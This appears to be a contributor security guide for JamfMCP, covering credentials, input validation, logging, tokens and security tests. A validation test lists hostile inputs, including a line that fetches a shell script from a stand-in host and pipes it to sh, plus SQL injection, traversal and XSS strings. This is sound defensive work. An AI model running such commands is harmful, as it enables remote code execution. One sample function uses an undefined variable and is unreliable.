(security_considerations)=
# Security Considerations

:::{rst-class} lead
Essential security practices for JamfMCP contributors to ensure safe and secure code
:::

:::{warning}
Security is a shared responsibility. Every contributor plays a role in maintaining the security posture of JamfMCP. This guide outlines critical security considerations when developing features or fixing bugs.
:::

## Core Security Principles

### 🔐 Never Expose Credentials

**All credentials must come from environment variables or secure storage**

```python
# ✅ GOOD - Credentials from environment
auth = JamfAuth(
    server=os.getenv("JAMF_URL"),
    client_id=os.getenv("JAMF_CLIENT_ID"),
    client_secret=os.getenv("JAMF_CLIENT_SECRET")
)

# ❌ BAD - Never hardcode credentials
auth = JamfAuth(
    server="https://company.jamfcloud.com",
    client_id="actual_client_id",  # NEVER DO THIS
    client_secret="actual_secret"   # NEVER DO THIS
)
```

### 🛡️ Input Validation

**Validate and sanitize all user inputs before processing**

```python
import re
from typing import Any

def validate_serial(serial: str) -> str:
    """
    Validate and sanitize computer serial number.

    :param serial: Raw serial number input
    :type serial: str
    :return: Validated serial number
    :rtype: str
    :raises ValueError: If serial is invalid
    """
    if not serial or not isinstance(serial, str):
        raise ValueError("Serial number must be a non-empty string")

    # Remove whitespace and convert to uppercase
    serial = serial.strip().upper()

    # Validate format (alphanumeric, 10-20 chars)
    if not re.match(r'^[A-Z0-9]{10,20}$', serial):
        raise ValueError("Invalid serial number format")

    return serial

def validate_computer_id(computer_id: str | int) -> int:
    """
    Validate computer ID input.

    :param computer_id: Computer ID as string or integer
    :type computer_id: str | int
    :return: Validated computer ID
    :rtype: int
    :raises ValueError: If ID is invalid
    """
    try:
        id_int = int(computer_id)
        if id_int <= 0 or id_int > 2147483647:  # Valid int32 range
            raise ValueError("Computer ID out of valid range")
        return id_int
    except (ValueError, TypeError) as e:
        raise ValueError(f"Invalid computer ID: {computer_id}") from e
```

### 📝 Secure Logging

**Never log sensitive information**

```python
import logging

logger = logging.getLogger(__name__)

# ✅ GOOD - Log without sensitive data
logger.info("Authenticating with Jamf Pro server")
logger.debug("Processing computer ID: %s", computer_id)

# ❌ BAD - Never log credentials or tokens
# logger.info(f"Using credentials: {client_secret}")  # NEVER
# logger.debug(f"Token: {access_token}")              # NEVER

# ✅ GOOD - Sanitize error messages
try:
    result = await api_call()
except Exception as e:
    # Log error type without exposing internals
    logger.error("API call failed: %s", e.__class__.__name__)
    # Full details only at DEBUG level
    logger.debug("Error details: %s", str(e))
```

## Authentication & Token Management

### OAuth Token Handling

The project uses OAuth2 client credentials flow with automatic token refresh:

:::{admonition} Jamf Pro SDK
:class: tip

For full documentation on Credential Providers, see the [Jamf Pro SDK](https://macadmins.github.io/jamf-pro-sdk-python/reference/credentials.html) official documentation
:::

```python
class ApiClientCredentialsProvider(CredentialsProvider):
    """Secure OAuth2 token management."""

    async def _request_access_token(self) -> AccessToken:
        """Request new token with secure handling."""
        # Token automatically refreshes before expiration
        # Never log token values
        # Token stored in memory only
```

:::{warning}
**Token Security Rules:**
- Never persist tokens to disk unless storing in keychain with the `keyring` library
- Never include tokens in error messages
- Never log token values at any level
- Implement proper token cleanup on shutdown
:::

## Data Protection

### Sanitizing API Responses

Remove or mask sensitive data from API responses before processing:

```python
def sanitize_user_data(user_info: dict[str, Any]) -> dict[str, Any]:
    """
    Sanitize user information for safe handling.

    :param user_info: Raw user data from API
    :type user_info: dict[str, Any]
    :return: Sanitized user data
    :rtype: dict[str, Any]
    """
    # Remove sensitive fields entirely
    sensitive_fields = ["password", "api_key", "token", "secret"]
    for field in sensitive_fields:
        sanitized.pop(field, None)

    return sanitized
```

### Error Message Sanitization

```python
def create_safe_error_response(error: Exception) -> dict[str, str]:
    """
    Create sanitized error response for users.

    :param error: The exception that occurred
    :type error: Exception
    :return: Safe error dictionary
    :rtype: dict[str, str]
    """
    # Map specific errors to safe messages
    error_map = {
        ValueError: "Invalid input provided",
        ConnectionError: "Unable to connect to service",
        TimeoutError: "Request timed out",
        PermissionError: "Insufficient permissions"
    }

    error_type = type(error)
    message = error_map.get(error_type, "An error occurred")

    return {
        "error": error_type.__name__,
        "message": message
        # Never include: stack traces, file paths, credentials
    }
```

## Testing Security

### Security-Focused Tests

Include security tests in your contributions:

```python
import pytest
from unittest.mock import patch

class TestSecurityPractices:
    """Security-focused test suite."""

    @pytest.mark.asyncio
    async def test_credentials_not_logged(self):
        """Ensure credentials are never logged."""
        with patch('jamfmcp.auth.logger') as mock_logger:
            auth = JamfAuth(
                client_id="secret_id",
                client_secret="secret_password"
            )

            # Verify no secrets in logs
            for call in mock_logger.method_calls:
                call_str = str(call)
                assert "secret_id" not in call_str
                assert "secret_password" not in call_str

    def test_input_validation_prevents_injection(self):
        """Test that input validation prevents injection attacks."""
        malicious_inputs = [
            "'; DROP TABLE computers; --",
            "../../../etc/passwd",
            "<script>alert('xss')</script>",
            "$(curl evil.com/shell.sh | sh)"
        ]

        for evil_input in malicious_inputs:
            with pytest.raises(ValueError):
                validate_serial(evil_input)

    def test_error_messages_sanitized(self):
        """Verify error messages don't leak sensitive info."""
        error = ValueError("Database connection failed at 192.168.1.100")
        safe_response = create_safe_error_response(error)

        assert "192.168.1.100" not in safe_response["message"]
        assert "Database" not in safe_response["message"]
```

## Dependency Security

### Managing Dependencies

```toml
# pyproject.toml - Pin versions for security
[project]
dependencies = [
    "httpx==0.27.0",  # Pin to tested version
    "pydantic>=2.0,<3.0",  # Allow patch updates
    "fastmcp>=0.1.0",  # Minimum version for security fixes
]
```

### Security Scanning

```bash
# Check for known vulnerabilities
pip-audit

# Update dependencies safely
uv pip compile --upgrade-package httpx
```

## Code Review Security Checklist

When reviewing code, check for:

- [ ] **No hardcoded credentials** or secrets
- [ ] **Input validation** on all user inputs
- [ ] **No sensitive data** in logs or error messages
- [ ] **Proper error handling** without information leakage
- [ ] **Secure defaults** for all configurations
- [ ] **Rate limiting** considerations for API calls
- [ ] **Timeout settings** on all network requests
- [ ] **Dependency versions** are current and secure

## Additional Resources

:::{seealso}
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Python Security Best Practices](https://python.readthedocs.io/en/latest/library/secrets.html)
- [Jamf Pro Security](https://docs.jamf.com/jamf-pro/documentation/Jamf_Pro_Security_Overview.html)
:::
